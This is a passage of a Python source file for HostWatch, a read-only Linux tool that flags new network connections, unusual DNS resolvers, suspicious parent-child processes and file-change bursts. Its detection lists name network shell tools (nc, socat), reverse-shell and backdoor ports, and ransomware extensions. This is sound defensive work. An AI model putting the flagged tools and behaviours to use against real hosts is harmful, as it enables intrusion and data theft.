#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
 HOSTWATCH
 Four Host Behaviour Detectors in One - CLI + Web App
--------------------------------------------------------------------------------
 Author  : Karanam Shrivasta
 GitHub  : https://github.com/mrshrivasta
 LinkedIn: https://www.linkedin.com/in/karanam-shrivasta/
 Version : 1.0.0
--------------------------------------------------------------------------------
 THE FOUR DETECTORS

   1. NEW NETWORK CONNECTIONS
      Every outbound connection this machine makes, matched to the process that
      owns it, compared against everything seen before. The signal is not "a
      connection exists" - it is "this program has never talked to that place
      before".

   2. UNEXPECTED DNS QUERIES
      Which resolvers this machine is actually querying, and - where packet
      capture is available - the names being asked for. A query going somewhere
      other than your configured resolver means something is bypassing it.

   3. SUSPICIOUS PARENT-CHILD PROCESSES
      Not which programs are running, but who started them. A web server that
      spawns a shell, or a document viewer that spawns a script interpreter, is
      the shape of exploitation - the individual programs are all legitimate.

   4. RAPID FILE MODIFICATION
      Bursts of writes across many files in a short window, which is what
      ransomware looks like from the outside. It is also what a build, a backup,
      an update and a git checkout look like, which is the whole problem.

 *** EVERY ONE OF THESE IS A HEURISTIC, NOT A VERDICT ***
   This is the caveat that governs the entire tool. None of these four things is
   inherently bad:

     - a new connection is what happens the first time you use any program
     - a query to a public resolver may be your own deliberate configuration
     - build systems, installers and service managers spawn shells constantly
     - a compile, a backup or an unzip modifies thousands of files in seconds

   What makes any of them interesting is CONTEXT this tool does not have. It
   reports what is unusual against what it has seen before, and explains why the
   pattern is worth a look. Deciding whether it is actually wrong needs you.
   Approve what you recognise and later checks stay quiet about it.

 WHAT IT CANNOT SEE
   It polls. Anything that starts and finishes between two polls is invisible -
   a process that lives for 50 milliseconds, or a connection opened and closed
   in between. Watch mode narrows that window but never closes it.

   DNS over HTTPS and DNS over TLS are INVISIBLE to the DNS detector. They look
   like ordinary HTTPS to port 443, which is precisely why they exist. A browser
   using DoH will show no DNS queries here at all, and that is not a clean
   result - it is a blind spot.

   It only sees changes since it started running. Whatever was already happening
   when you first ran it becomes the baseline.

 READ-ONLY
   It reads /proc, the filesystem and (optionally) network traffic. It kills no
   process, blocks no connection and modifies no file.

 LEGAL DISCLAIMER
   Run it on machines you are responsible for. Provided "as is" with no warranty;
   the author accepts no liability for any loss or damage.
================================================================================
"""

from __future__ import annotations

import argparse
import binascii
import csv
import ctypes
import errno
import hashlib
import html as _html
import io
import ipaddress
import json
import math
import os
import platform
import re
import select
import shutil
import socket
import sqlite3
import struct
import sys
import textwrap
import time
from datetime import datetime, timezone

APP_NAME = "HostWatch"
APP_SHORT = "HOSTWATCH"
VERSION = "1.0.0"
AUTHOR = "Karanam Shrivasta"
GITHUB = "https://github.com/mrshrivasta"
LINKEDIN = "https://www.linkedin.com/in/karanam-shrivasta/"
DEFAULT_DB = os.environ.get("HOSTWATCH_DB", "hostwatch.db")

HEURISTIC_NOT_VERDICT = (
    "Every detector here is a heuristic, not a verdict. A new connection is what happens the "
    "first time you use a program; build systems spawn shells constantly; a compile modifies "
    "thousands of files in seconds. This reports what is unusual against what it has seen "
    "before and explains why the pattern matters - deciding whether it is actually wrong "
    "needs context only you have."
)
DOH_BLIND_SPOT = (
    "DNS over HTTPS and DNS over TLS are INVISIBLE here. They look like ordinary traffic to "
    "port 443, which is why they exist. A browser using DoH shows no DNS queries at all - "
    "that is a blind spot, not a clean result."
)
POLLING_LIMIT = (
    "This polls. Anything that starts and finishes between two polls is never seen - a "
    "process living 50 milliseconds, or a connection opened and closed in between. Watch "
    "mode narrows that window but never closes it."
)
DISCLAIMER_SHORT = (
    "Read-only. Four heuristic detectors: new connections, DNS queries, process ancestry and "
    "file-change bursts. None of them is a verdict - all four fire on ordinary activity, and "
    "context you have is what decides."
)
DISCLAIMER_LONG = textwrap.dedent(
    """\
    EVERY DETECTOR HERE IS A HEURISTIC, NOT A VERDICT. None of the four things this looks for
    is inherently bad: a new connection is what happens the first time you use a program, a
    query to a public resolver may be your own configuration, build systems and service
    managers spawn shells constantly, and a compile or a backup modifies thousands of files
    in seconds. What makes any of it interesting is context this tool does not have.

    IT POLLS, SO IT MISSES THINGS. A process that lives 50 milliseconds, or a connection
    opened and closed between two polls, is never seen. Watch mode narrows the window and
    does not close it.

    DNS OVER HTTPS AND DNS OVER TLS ARE INVISIBLE. They look like ordinary traffic to port
    443. A browser using DoH will show no DNS queries here, and that is a blind spot rather
    than a clean result.

    IT ONLY SEES CHANGES SINCE IT STARTED. Whatever was already happening on the first run
    becomes the baseline, which is why the first run finds everything and the second finds
    almost nothing.

    READ-ONLY. It reads /proc, the filesystem and optionally network traffic. It kills no
    process, blocks no connection and modifies no file.

    Run it on machines you are responsible for. Provided "as is" with no warranty; the author
    accepts no liability for any loss or damage."""
)

SEVERITIES = ["critical", "high", "medium", "low", "info"]
SEV_WEIGHT = {"critical": 35.0, "high": 18.0, "medium": 7.0, "low": 2.5, "info": 0.0}
SEV_COLOR = {"critical": "#e5484d", "high": "#f76808", "medium": "#ffb224",
             "low": "#3e9dd8", "info": "#8b8f9b"}
DETECTORS = ["connections", "dns", "processes", "files"]
DETECTOR_COLOR = {"connections": "#5b8def", "dns": "#22b8cf",
                  "processes": "#9775fa", "files": "#f76808"}


def risk_band(score: float) -> tuple[str, str]:
    if score >= 40:
        return "investigate now", "#e5484d"
    if score >= 20:
        return "worth investigating", "#f76808"
    if score >= 8:
        return "worth a look", "#ffb224"
    if score > 0:
        return "minor notes", "#3e9dd8"
    return "nothing unusual", "#30a46c"


# =============================================================================
# SECTION 1 - Utilities
# =============================================================================

def now_iso() -> str:
    return datetime.now(timezone.utc).replace(microsecond=0).isoformat()


def ts_pretty(iso: str | None) -> str:
    if not iso:
        return "-"
    try:
        return datetime.fromisoformat(iso).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return iso


def clamp(v, lo, hi):
    return max(lo, min(hi, v))


def html_escape(s) -> str:
    return _html.escape("" if s is None else str(s), quote=True)


def shorten(s, n=90) -> str:
    s = " ".join(str(s or "").split())
    return s if len(s) <= n else s[:n - 1] + "\u2026"


def fmt_bytes(n) -> str:
    if n is None:
        return "-"
    n = float(n)
    for u in ("B", "KiB", "MiB", "GiB"):
        if n < 1024 or u == "GiB":
            return f"{n:.{0 if u == 'B' else 1}f} {u}"
        n /= 1024.0
    return f"{n:.1f} GiB"


def fmt_duration(seconds) -> str:
    if seconds is None:
        return "-"
    seconds = int(seconds)
    d, r = divmod(seconds, 86400)
    h, r = divmod(r, 3600)
    m, s = divmod(r, 60)
    if d:
        return f"{d}d {h}h"
    if h:
        return f"{h}h {m}m"
    if m:
        return f"{m}m {s}s"
    return f"{s}s"


def ago(iso: str | None) -> str:
    if not iso:
        return "never"
    try:
        delta = (datetime.now(timezone.utc) - datetime.fromisoformat(iso)).total_seconds()
    except Exception:
        return "-"
    return fmt_duration(delta) + " ago" if delta >= 0 else "in the future"


def is_root() -> bool:
    try:
        return os.geteuid() == 0
    except AttributeError:
        return False


def F(detector, category, title, severity, description, evidence="", advice=""):
    return {"detector": detector, "category": category, "title": title,
            "severity": severity, "description": description,
            "evidence": str(evidence)[:2500], "advice": advice}


class Result:
    def __init__(self, name: str):
        self.name = name
        self.data = None
        self.status = "ok"
        self.detail = ""

    def unavailable(self, detail):
        self.status, self.detail = "unavailable", detail
        return self

    def partial(self, detail):
        self.status = "partial"
        self.detail = " ".join((self.detail + "; " + detail).strip("; ").split())[:400]
        return self


# =============================================================================
# SECTION 2 - DETECTOR ONE: new network connections
#   Reads /proc/net/tcp and friends, then maps each socket inode back to the
#   process that holds it by walking /proc/*/fd. No external binary is needed and
#   nothing is sent.
# =============================================================================

TCP_STATES = {
    "01": "ESTABLISHED", "02": "SYN_SENT", "03": "SYN_RECV", "04": "FIN_WAIT1",
    "05": "FIN_WAIT2", "06": "TIME_WAIT", "07": "CLOSE", "08": "CLOSE_WAIT",
    "09": "LAST_ACK", "0A": "LISTEN", "0B": "CLOSING",
}

# Ports whose traffic is worth naming in a report. Not a threat list - it exists
# so a finding can say "this is a mail submission port" instead of "port 587".
NOTABLE_PORTS = {
    22: "SSH", 23: "Telnet, which is unencrypted", 25: "SMTP mail",
    53: "DNS", 80: "HTTP, unencrypted", 110: "POP3", 143: "IMAP",
    443: "HTTPS", 445: "SMB file sharing", 587: "mail submission",
    993: "IMAPS", 995: "POP3S", 1080: "SOCKS proxy", 1194: "OpenVPN",
    3128: "an HTTP proxy", 3306: "MySQL", 3389: "RDP", 4444: "a port commonly "
    "used by reverse shells and exploitation frameworks",
    5432: "PostgreSQL", 5555: "ADB, or a common backdoor port",
    6379: "Redis", 6667: "IRC, historically used for command and control",
    8080: "an HTTP alternative", 8443: "an HTTPS alternative",
    9001: "Tor", 9030: "Tor directory", 9050: "the Tor SOCKS port",
    9051: "the Tor control port", 27017: "MongoDB",
    31337: "a port with a long history of use by backdoors",
}


def _decode_addr(hexaddr: str) -> tuple[str, int]:
    """/proc/net stores addresses little-endian hex."""
    host, _, port = hexaddr.partition(":")
    port = int(port, 16) if port else 0
    if len(host) == 8:
        raw = struct.pack("<I", int(host, 16))
        return socket.inet_ntop(socket.AF_INET, raw), port
    if len(host) == 32:
        parts = [host[i:i + 8] for i in range(0, 32, 8)]
        raw = b"".join(struct.pack("<I", int(p, 16)) for p in parts)
        return socket.inet_ntop(socket.AF_INET6, raw), port
    return host, port


def socket_inode_map() -> tuple[dict, list]:
    """inode -> process, by walking every /proc/*/fd. Needs privileges for other
    users' processes, and says so rather than silently reporting fewer."""
    out: dict[int, dict] = {}
    problems: list[str] = []
    denied = 0
    try:
        pids = [d for d in os.listdir("/proc") if d.isdigit()]
    except OSError as e:
        return out, [f"could not list /proc: {e}"]
    for pid in pids:
        fddir = f"/proc/{pid}/fd"
        try:
            fds = os.listdir(fddir)
        except PermissionError:
            denied += 1
            continue
        except (FileNotFoundError, ProcessLookupError):
            continue
        except OSError:
            continue
        info = None
        for fd in fds:
            try:
                target = os.readlink(os.path.join(fddir, fd))
            except OSError:
                continue
            if not target.startswith("socket:["):
                continue
            try:
                inode = int(target[8:-1])
            except ValueError:
                continue
            if info is None:
                info = process_info(int(pid))
            out[inode] = info
    if denied:
        problems.append(f"{denied} process(es) could not be inspected without privileges, "
                        f"so some connections will have no owner shown")
    return out, problems


def process_info(pid: int) -> dict:
    out = {"pid": pid, "name": None, "exe": None, "cmdline": None, "ppid": None,
           "uid": None, "user": None, "started": None}
    try:
        with open(f"/proc/{pid}/stat") as fh:
            raw = fh.read()
        lp, rp = raw.find("("), raw.rfind(")")
        out["name"] = raw[lp + 1:rp]
        rest = raw[rp + 2:].split()
        out["ppid"] = int(rest[1])
        out["starttime"] = int(rest[19]) if len(rest) > 19 else None
    except Exception:
        pass
    try:
        out["exe"] = os.readlink(f"/proc/{pid}/exe")
    except OSError:
        pass
    try:
        with open(f"/proc/{pid}/cmdline", "rb") as fh:
            out["cmdline"] = fh.read().replace(b"\x00", b" ").decode(
                "utf-8", "replace").strip() or None
    except Exception:
        pass
    try:
        with open(f"/proc/{pid}/status") as fh:
            for lineno in fh:
                if lineno.startswith("Uid:"):
                    out["uid"] = int(lineno.split()[1])
                    break
    except Exception:
        pass
    if out["uid"] is not None:
        try:
            import pwd
            out["user"] = pwd.getpwuid(out["uid"]).pw_name
        except Exception:
            out["user"] = str(out["uid"])
    return out


def read_connections(include_listening: bool = False) -> Result:
    r = Result("connections")
    r.data = {"connections": [], "listening": [], "owner_coverage": 0.0}
    if not sys.platform.startswith("linux"):
        return r.unavailable(
            f"connections are read from /proc/net, which is Linux-only; this is "
            f"{sys.platform}. The connection detector did NOT run.")
    inodes, problems = socket_inode_map()
    for p in problems:
        r.partial(p)
    found_any = False
    owned = total = 0
    for fname, proto in (("tcp", "tcp"), ("tcp6", "tcp6"),
                         ("udp", "udp"), ("udp6", "udp6")):
        path = f"/proc/net/{fname}"
        if not os.path.exists(path):
            continue
        found_any = True
        try:
            with open(path) as fh:
                next(fh, None)
                for raw in fh:
                    f = raw.split()
                    if len(f) < 10:
                        continue
                    try:
                        local_ip, local_port = _decode_addr(f[1])
                        remote_ip, remote_port = _decode_addr(f[2])
                        state = TCP_STATES.get(f[3].upper(), f[3])
                        inode = int(f[9])
                    except (ValueError, IndexError):
                        continue
                    owner = inodes.get(inode)
                    total += 1
                    if owner:
                        owned += 1
                    entry = {
                        "proto": proto, "local_ip": local_ip, "local_port": local_port,
                        "remote_ip": remote_ip, "remote_port": remote_port,
                        "state": state, "inode": inode,
                        "pid": (owner or {}).get("pid"),
                        "process": (owner or {}).get("name"),
                        "exe": (owner or {}).get("exe"),
                        "cmdline": (owner or {}).get("cmdline"),
                        "user": (owner or {}).get("user"),
                    }
                    if state == "LISTEN" or (proto.startswith("udp")
                                             and remote_ip in ("0.0.0.0", "::")):
                        entry["kind"] = "listening"
                        r.data["listening"].append(entry)
                    elif remote_ip in ("0.0.0.0", "::") or remote_port == 0:
                        continue
                    else:
                        entry["kind"] = "outbound"
                        entry["key"] = connection_key(entry)
                        entry["remote_class"] = classify_remote(remote_ip)
                        entry["port_note"] = NOTABLE_PORTS.get(remote_port)
                        r.data["connections"].append(entry)
        except OSError as e:
            r.partial(f"{path} could not be read: {e}")
    if not found_any:
        return r.unavailable("no /proc/net tables were present, so nothing could be read")
    r.data["owner_coverage"] = round(100.0 * owned / total, 1) if total else 0.0
    if not include_listening:
        pass
    return r


def connection_key(c: dict) -> str:
    """What counts as 'the same connection' across checks.

    Deliberately NOT the local port, which is ephemeral and would make every
    connection new every time. A connection is the same when the same program
    talks to the same place.
    """
    proc = c.get("exe") or c.get("process") or "unknown"
    return f"{proc}|{c['remote_ip']}|{c['remote_port']}|{c['proto']}"


def classify_remote(ip: str) -> str:
    try:
        addr = ipaddress.ip_address(ip)
    except ValueError:
        return "unknown"
    if addr.is_loopback:
        return "loopback"
    if addr.is_private:
        return "private"
    if addr.is_link_local:
        return "link-local"
    if addr.is_multicast:
        return "multicast"
    return "public"


# =============================================================================
# SECTION 3 - DETECTOR TWO: unexpected DNS queries
#   Two sources. Which resolvers are configured and being talked to comes from
#   /proc and resolv.conf and needs no privileges. The actual NAMES being queried
#   need packet capture, which needs root - and when it is unavailable the report
#   says the queries were not seen rather than implying there were none.
# =============================================================================

DNS_PORT = 53
DOT_PORT = 853
DOH_HOSTS = {
    "dns.google", "cloudflare-dns.com", "mozilla.cloudflare-dns.com", "doh.opendns.com",
    "dns.quad9.net", "doh.cleanbrowsing.org", "dns.adguard.com", "doh.nextdns.io",
    "chrome.cloudflare-dns.com", "dns.nextdns.io",
}
# Suffixes that are legitimately noisy but worth naming when they appear.
DYNAMIC_DNS_SUFFIXES = (
    ".duckdns.org", ".no-ip.org", ".no-ip.com", ".ddns.net", ".hopto.org",
    ".serveo.net", ".ngrok.io", ".ngrok-free.app", ".trycloudflare.com",
    ".loca.lt", ".localtunnel.me", ".portmap.io", ".myftp.org", ".zapto.org",
)


def configured_resolvers() -> dict:
    out = {"resolvers": [], "search": [], "source": None, "errors": []}
    for path in ("/etc/resolv.conf", "/run/systemd/resolve/resolv.conf"):
        if not os.path.exists(path):
            continue
        try:
            with open(path) as fh:
                for raw in fh:
                    m = re.match(r"\s*nameserver\s+(\S+)", raw)
                    if m and m.group(1) not in out["resolvers"]:
                        out["resolvers"].append(m.group(1))
                    m = re.match(r"\s*search\s+(.+)", raw)
                    if m:
                        out["search"] = m.group(1).split()
            out["source"] = path
            break
        except OSError as e:
            out["errors"].append(f"{path}: {e}")
    return out


def parse_dns_name(data: bytes, offset: int, depth: int = 0) -> tuple[str, int]:
    """Decode a DNS name, following compression pointers."""
    labels = []
    original = offset
    jumped = False
    while offset < len(data) and depth < 10:
        length = data[offset]
        if length == 0:
            offset += 1
            break
        if length & 0xC0 == 0xC0:
            if offset + 1 >= len(data):
                break
            pointer = ((length & 0x3F) << 8) | data[offset + 1]
            if not jumped:
                original = offset + 2
                jumped = True
            sub, _ = parse_dns_name(data, pointer, depth + 1)
            if sub:
                labels.append(sub)
            offset = pointer
            break
        offset += 1
        labels.append(data[offset:offset + length].decode("utf-8", "replace"))
        offset += length
    return ".".join(l for l in labels if l), (original if jumped else offset)


DNS_TYPES = {1: "A", 2: "NS", 5: "CNAME", 6: "SOA", 12: "PTR", 15: "MX", 16: "TXT",
             28: "AAAA", 33: "SRV", 41: "OPT", 43: "DS", 48: "DNSKEY", 65: "HTTPS",
             255: "ANY"}


def parse_dns_query(data: bytes) -> dict | None:
    """The question section of a DNS message."""
    if len(data) < 12:
        return None
    try:
        txid, flags, qdcount, ancount, _ns, _ar = struct.unpack("!HHHHHH", data[:12])
    except struct.error:
        return None
    is_response = bool(flags & 0x8000)
    opcode = (flags >> 11) & 0xF
    rcode = flags & 0xF
    if qdcount == 0 or qdcount > 20:
        return None
    name, offset = parse_dns_name(data, 12)
    if not name:
        return None
    qtype = qclass = 0
    if offset + 4 <= len(data):
        qtype, qclass = struct.unpack("!HH", data[offset:offset + 4])
    return {"txid": txid, "is_response": is_response, "opcode": opcode, "rcode": rcode,
            "qname": name.rstrip("."), "qtype": DNS_TYPES.get(qtype, str(qtype)),
            "qtype_num": qtype, "questions": qdcount, "answers": ancount}


def capture_dns(seconds: float = 30.0, on_query=None) -> Result:
    """Sniff plaintext DNS from the wire.

    Needs root. Sees UDP port 53 only - DoH and DoT are invisible by design, and
    that limit is reported rather than left for the reader to assume.
    """
    r = Result("dns_capture")
    r.data = {"queries": [], "seconds": seconds, "packets": 0, "started": now_iso()}
    if not sys.platform.startswith("linux"):
        return r.unavailable(f"packet capture here uses AF_PACKET, which is Linux-only; "
                             f"this is {sys.platform}")
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
        sock.settimeout(0.5)
    except PermissionError:
        return r.unavailable(
            "packet capture needs root, so the NAMES being queried were not seen. Which "
            "resolvers are being contacted is still reported below - but an empty query "
            "list here means 'not captured', not 'no queries'.")
    except OSError as e:
        return r.unavailable(f"a capture socket could not be opened: {e}")
    deadline = time.time() + seconds
    try:
        while time.time() < deadline:
            try:
                frame = sock.recv(65535)
            except socket.timeout:
                continue
            except OSError:
                continue
            r.data["packets"] += 1
            parsed = _dns_from_frame(frame)
            if parsed:
                r.data["queries"].append(parsed)
                if on_query:
                    on_query(parsed)
    except KeyboardInterrupt:
        r.partial("interrupted before the full capture period elapsed")
    finally:
        try:
            sock.close()
        except Exception:
            pass
    r.data["ended"] = now_iso()
    return r


def _dns_from_frame(frame: bytes) -> dict | None:
    """Ethernet -> IPv4/IPv6 -> UDP -> DNS, by hand."""
    if len(frame) < 34:
        return None
    ethertype = struct.unpack("!H", frame[12:14])[0]
    offset = 14
    if ethertype == 0x8100:                     # VLAN tag
        if len(frame) < 38:
            return None
        ethertype = struct.unpack("!H", frame[16:18])[0]
        offset = 18
    if ethertype == 0x0800:
        if len(frame) < offset + 20:
            return None
        ihl = (frame[offset] & 0x0F) * 4
        proto = frame[offset + 9]
        src = socket.inet_ntop(socket.AF_INET, frame[offset + 12:offset + 16])
        dst = socket.inet_ntop(socket.AF_INET, frame[offset + 16:offset + 20])
        transport = offset + ihl
    elif ethertype == 0x86DD:
        if len(frame) < offset + 40:
            return None
        proto = frame[offset + 6]
        src = socket.inet_ntop(socket.AF_INET6, frame[offset + 8:offset + 24])
        dst = socket.inet_ntop(socket.AF_INET6, frame[offset + 24:offset + 40])
        transport = offset + 40
    else:
        return None
    if proto != 17 or len(frame) < transport + 8:
        return None
    sport, dport = struct.unpack("!HH", frame[transport:transport + 4])
    if DNS_PORT not in (sport, dport):
        return None
    payload = frame[transport + 8:]
    msg = parse_dns_query(payload)
    if not msg:
        return None
    return {"src": src, "dst": dst, "sport": sport, "dport": dport,
            "resolver": dst if dport == DNS_PORT else src,
            "at": now_iso(), **msg}


def dns_connections(connections: list[dict]) -> list[dict]:
    """Which resolvers are being talked to, from connection state alone.

    This needs no privileges and works even when capture does not, which is why
    the two are kept separate: one answers 'who is being asked', the other 'what
    is being asked'.
    """
    out = []
    for c in connections:
        if c["remote_port"] in (DNS_PORT, DOT_PORT):
            out.append({**c, "encrypted": c["remote_port"] == DOT_PORT})
    return out


# =============================================================================
# SECTION 4 - DETECTOR THREE: suspicious parent-child processes
#   The individual programs here are all legitimate. What makes a pair
#   interesting is the RELATIONSHIP: nothing about bash is suspicious, and
#   nginx starting bash is worth a look.
# =============================================================================

SHELLS = {"sh", "bash", "dash", "zsh", "ksh", "csh", "tcsh", "fish", "ash", "busybox"}
INTERPRETERS = {"python", "python2", "python3", "perl", "ruby", "php", "node", "lua",
                "tclsh", "osascript", "powershell", "pwsh", "wscript", "cscript"}
DOWNLOADERS = {"curl", "wget", "nc", "ncat", "netcat", "socat", "ftp", "tftp", "scp",
               "sftp", "rsync", "aria2c", "axel"}
# Programs that should essentially never start a shell. A match here is the
# classic shape of a service being exploited.
SERVERS = {"nginx", "apache2", "httpd", "lighttpd", "caddy", "tomcat", "java",
           "postgres", "mysqld", "mariadbd", "mongod", "redis-server", "memcached",
           "vsftpd", "proftpd", "smbd", "named", "bind", "dovecot", "postfix",
           "exim4", "sendmail", "cupsd", "sshd", "elasticsearch", "jenkins"}
DOCUMENT_APPS = {"soffice", "libreoffice", "acroread", "evince", "okular", "atril",
                 "xpdf", "mupdf", "thunderbird", "outlook", "winword", "excel",
                 "powerpnt", "wps", "et", "wpp"}
BROWSERS = {"firefox", "chrome", "chromium", "chromium-browser", "brave", "opera",
            "vivaldi", "epiphany", "midori", "safari", "msedge"}
# Pairs that look alarming in isolation and are entirely routine. Without these
# the detector would drown a normal machine in noise.
BENIGN_PARENTS = {"systemd", "init", "systemd-user-ru", "cron", "crond", "anacron",
                  "atd", "supervisord", "runit", "s6-supervise", "docker-containe",
                  "containerd-shim", "containerd", "dockerd", "podman", "conmon",
                  "make", "cmake", "ninja", "gradle", "maven", "mvn", "npm", "yarn",
                  "pnpm", "cargo", "go", "gcc", "cc1", "ld", "sh", "bash", "dash",
                  "tmux", "screen", "sshd", "login", "su", "sudo", "gnome-terminal-",
                  "konsole", "xterm", "alacritty", "kitty", "code", "vim", "nvim",
                  "emacs", "git", "ansible", "puppet", "chef-client", "salt-minion",
                  "jenkins", "gitlab-runner", "buildkitd", "kubelet"}


def process_name(info: dict) -> str:
    name = (info.get("name") or "").strip()
    if not name and info.get("exe"):
        name = os.path.basename(info["exe"])
    return name.lower()


def read_processes() -> Result:
    r = Result("processes")
    r.data = {"processes": {}, "denied": 0, "count": 0}
    if not sys.platform.startswith("linux"):
        return r.unavailable(f"process ancestry is read from /proc, which is Linux-only; "
                             f"this is {sys.platform}. This detector did NOT run.")
    try:
        pids = [int(d) for d in os.listdir("/proc") if d.isdigit()]
    except OSError as e:
        return r.unavailable(f"could not list /proc: {e}")
    for pid in pids:
        try:
            info = process_info(pid)
        except Exception:
            continue
        if info.get("name") is None:
            r.data["denied"] += 1
            continue
        r.data["processes"][pid] = info
    r.data["count"] = len(r.data["processes"])
    if r.data["denied"]:
        r.partial(f"{r.data['denied']} process(es) could not be read")
    if not r.data["processes"]:
        return r.unavailable("no processes could be read from /proc")
    return r


# Each rule is (parent set, child set, severity, label, why it matters).
ANCESTRY_RULES = [
    (SERVERS, SHELLS, "critical", "a network service started a shell",
     "A server process spawning a shell is the classic shape of remote code execution: "
     "the service was made to run a command. Both programs are legitimate; the "
     "relationship is not."),
    (SERVERS, DOWNLOADERS, "critical", "a network service started a download tool",
     "A service fetching something from the network is how a foothold becomes a payload. "
     "It is also how some legitimate health checks work, so confirm which."),
    (DOCUMENT_APPS, SHELLS, "critical", "a document application started a shell",
     "This is what a malicious macro or an exploited document viewer looks like. There is "
     "almost no legitimate reason for a PDF reader or an office suite to run a shell."),
    (DOCUMENT_APPS, INTERPRETERS, "critical",
     "a document application started a script interpreter",
     "A document that runs a script is running code you did not ask it to run."),
    (DOCUMENT_APPS, DOWNLOADERS, "critical",
     "a document application started a download tool",
     "The standard second stage: the document fetches the real payload."),
    (BROWSERS, SHELLS, "high", "a browser started a shell",
     "Browsers do spawn helpers, but rarely a shell. Worth understanding - it can be a "
     "legitimate extension or file handler, or it can be an exploited renderer."),
    (BROWSERS, DOWNLOADERS, "medium", "a browser started a download tool",
     "Unusual: browsers download things themselves. Often an extension or a helper script."),
    (SHELLS, DOWNLOADERS, "low", "a shell started a download tool",
     "Completely ordinary at a terminal - this is you typing curl. Included because the "
     "same pair appears inside a script that a compromised service started, where the "
     "chain above it is what matters."),
    (INTERPRETERS, SHELLS, "low", "a script interpreter started a shell",
     "Very common in build tooling and automation. Listed for completeness."),
]


def analyse_ancestry(processes: dict) -> list[dict]:
    """Parent-child pairs worth a second look, with the chain that produced them."""
    out = []
    for pid, info in processes.items():
        ppid = info.get("ppid")
        parent = processes.get(ppid)
        if not parent or ppid in (0, 1):
            continue
        child_name = process_name(info)
        parent_name = process_name(parent)
        if not child_name or not parent_name:
            continue
        for parents, children, sev, label, why in ANCESTRY_RULES:
            if _matches(parent_name, parents) and _matches(child_name, children):
                # A benign supervisor explains most of the noise - but only when
                # nothing further up the chain is itself alarming. curl under bash
                # is you typing; curl under bash under nginx is the whole attack,
                # and suppressing it because bash is ordinary would lose exactly
                # the case this detector exists for.
                tainted = tainted_ancestor(processes, pid)
                if parent_name in BENIGN_PARENTS and sev in ("low", "medium") \
                        and not tainted:
                    continue
                if tainted and sev in ("low", "medium"):
                    sev = "critical"
                    why = (f"{why} Here it sits below {tainted}, which should never have "
                           f"started this chain - that is what makes it serious rather "
                           f"than ordinary.")
                out.append({
                    "pid": pid, "ppid": ppid, "child": child_name, "parent": parent_name,
                    "severity": sev, "label": label, "why": why,
                    "child_cmdline": shorten(info.get("cmdline"), 200),
                    "parent_cmdline": shorten(parent.get("cmdline"), 200),
                    "user": info.get("user"),
                    "chain": ancestry_chain(processes, pid),
                })
                break
    return out


def tainted_ancestor(processes: dict, pid: int, limit: int = 8) -> str | None:
    """Is anything above this process something that should not start a chain?

    Looks past the immediate parent, because the interesting shape is usually
    three deep: a server, then a shell, then whatever the shell fetched.
    """
    seen = set()
    cur = processes.get(pid, {}).get("ppid")
    depth = 0
    while cur and cur not in seen and depth < limit:
        seen.add(cur)
        info = processes.get(cur)
        if not info:
            return None
        name = process_name(info)
        if _matches(name, SERVERS) or _matches(name, DOCUMENT_APPS):
            return name
        cur = info.get("ppid")
        depth += 1
    return None


def _matches(name: str, group: set) -> bool:
    if name in group:
        return True
    base = re.sub(r"[\d.]+$", "", name)          # python3.12 -> python
    return base in group


def ancestry_chain(processes: dict, pid: int, limit: int = 8) -> str:
    """pid back to init, which is what actually tells the story."""
    parts, seen = [], set()
    cur = pid
    while cur and cur not in seen and len(parts) < limit:
        seen.add(cur)
        info = processes.get(cur)
        if not info:
            break
        parts.append(f"{process_name(info) or '?'}({cur})")
        cur = info.get("ppid")
        if cur in (0,):
            break
    return " <- ".join(parts)


# =============================================================================
# SECTION 5 - DETECTOR FOUR: rapid file modification
#   Counts writes across a directory tree in a window. This is what ransomware
#   looks like from outside - and equally what a compile, a backup, an unzip and
#   a git checkout look like, which is why the report leads with that.
# =============================================================================

# Extensions that appear when files have been encrypted and renamed. Not a
# malware list - a short set of well-documented suffixes that are worth naming.
SUSPICIOUS_EXTENSIONS = {
    ".encrypted", ".enc", ".locked", ".crypto", ".crypt", ".cry", ".vault",
    ".locky", ".zepto", ".cerber", ".wannacry", ".wncry", ".wcry", ".cryp1",
    ".onion", ".aes", ".rgh", ".pzdc", ".good", ".ecc", ".ezz", ".exx",
    ".ttt", ".xyz", ".zzz", ".micro", ".encrypt", ".R5A", ".RDM", ".RRK",
}
RANSOM_NOTE_HINTS = ("readme", "decrypt", "how_to", "howto", "recover", "restore",
                     "your_files", "ransom", "unlock")
SKIP_DIRS = {".git", "node_modules", "__pycache__", ".cache", ".venv", "venv",
             ".tox", "target", "build", "dist", ".mypy_cache", ".pytest_cache",
             "site-packages", ".npm", ".gradle", ".m2"}


def scan_tree(root: str, max_files: int = 200_000, max_depth: int = 12,
              skip_common: bool = True) -> Result:
    """A snapshot: path -> (mtime, size). Comparing two of these is the detector."""
    r = Result("files")
    r.data = {"root": os.path.abspath(root), "files": {}, "scanned": 0,
              "skipped_dirs": 0, "truncated": False, "errors": 0,
              "started": now_iso()}
    if not os.path.isdir(root):
        return r.unavailable(f"'{root}' is not a directory")
    base_depth = os.path.abspath(root).rstrip(os.sep).count(os.sep)
    for dirpath, dirnames, filenames in os.walk(root, topdown=True, followlinks=False):
        if dirpath.count(os.sep) - base_depth >= max_depth:
            dirnames[:] = []
            continue
        if skip_common:
            before = len(dirnames)
            dirnames[:] = [d for d in dirnames if d not in SKIP_DIRS]
            r.data["skipped_dirs"] += before - len(dirnames)
        for name in filenames:
            if r.data["scanned"] >= max_files:
                r.data["truncated"] = True
                dirnames[:] = []
                break
            path = os.path.join(dirpath, name)
            try:
                st = os.lstat(path)
            except OSError:
                r.data["errors"] += 1
                continue
            if not (st.st_mode & 0o170000) == 0o100000:      # regular files only
                continue
            r.data["files"][path] = (st.st_mtime, st.st_size)
            r.data["scanned"] += 1
        if r.data["truncated"]:
            break
    r.data["ended"] = now_iso()
    if r.data["truncated"]:
        r.partial(f"stopped after {max_files} files - the tree is larger than the limit, "
                  f"so this is a partial view")
    if r.data["errors"]:
        r.partial(f"{r.data['errors']} path(s) could not be read")
    return r


def diff_trees(before: dict, after: dict, window_seconds: float) -> dict:
    """What changed between two snapshots, and how fast."""
    out = {"modified": [], "created": [], "deleted": [], "renamed_suspicious": [],
           "notes": [], "window": window_seconds, "rate": 0.0}
    before_files = before.get("files", {})
    after_files = after.get("files", {})
    for path, (mtime, size) in after_files.items():
        prev = before_files.get(path)
        if prev is None:
